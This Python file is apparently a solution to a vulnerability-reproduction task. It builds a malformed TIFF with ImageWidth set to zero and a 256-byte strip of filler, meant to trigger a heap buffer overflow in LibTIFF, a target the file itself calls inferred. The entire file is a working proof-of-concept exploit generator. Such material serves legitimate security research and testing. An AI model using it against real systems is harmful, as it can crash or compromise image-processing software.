import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: LibTIFF (inferred)
        Vulnerability: Heap Buffer Overflow due to missing zero width/height check.
        """
        # Build a valid TIFF structure but with ImageWidth = 0
        
        # TIFF Header: Little Endian 'II', Version 42, Offset to first IFD 8
        header = struct.pack('<II', 0x002A4949, 8)
        
        # IFD Tags
        # We need to set ImageWidth (256) to 0.
        # We define one strip with some data to trigger a read/write.
        
        # Tag structure: (TagID, Type, Count, Value)
        # Type 3 = SHORT (2 bytes), Type 4 = LONG (4 bytes)
        tags = [
            (256, 3, 1, 0),         # ImageWidth = 0 (TRIGGER)
            (257, 3, 1, 10),        # ImageLength = 10
            (258, 3, 1, 8),         # BitsPerSample = 8
            (259, 3, 1, 1),         # Compression = 1 (None)
            (262, 3, 1, 1),         # PhotometricInterpretation = 1 (BlackIsZero)
            (273, 4, 1, 0),         # StripOffsets (Placeholder)
            (277, 3, 1, 1),         # SamplesPerPixel = 1
            (278, 3, 1, 10),        # RowsPerStrip = 10
            (279, 4, 1, 256)        # StripByteCounts = 256 bytes (Large enough to overflow if buf=0)
        ]
        
        # Tags must be sorted by ID for valid TIFF
        tags.sort(key=lambda x: x[0])
        
        # Calculate offsets
        # Header is 8 bytes.
        # IFD starts at 8.
        # IFD structure: NumEntries(2) + Entry(12)*N + NextIFD(4)
        num_tags = len(tags)
        ifd_size = 2 + (num_tags * 12) + 4
        
        # Data will be placed immediately after IFD
        data_offset = 8 + ifd_size
        
        # Update StripOffsets tag
        updated_tags = []
        for t in tags:
            tag_id, tag_type, count, val = t
            if tag_id == 273:
                val = data_offset
            updated_tags.append((tag_id, tag_type, count, val))
            
        # Serialize IFD
        ifd = bytearray()
        ifd += struct.pack('<H', num_tags)
        
        for t in updated_tags:
            tag_id, tag_type, count, val = t
            # Pack entry: Tag(2), Type(2), Count(4), Value/Offset(4)
            ifd += struct.pack('<HHII', tag_id, tag_type, count, val)
            
        ifd += struct.pack('<I', 0) # Next IFD offset = 0
        
        # Payload Data
        payload = b'\x41' * 256
        
        return header + ifd + payload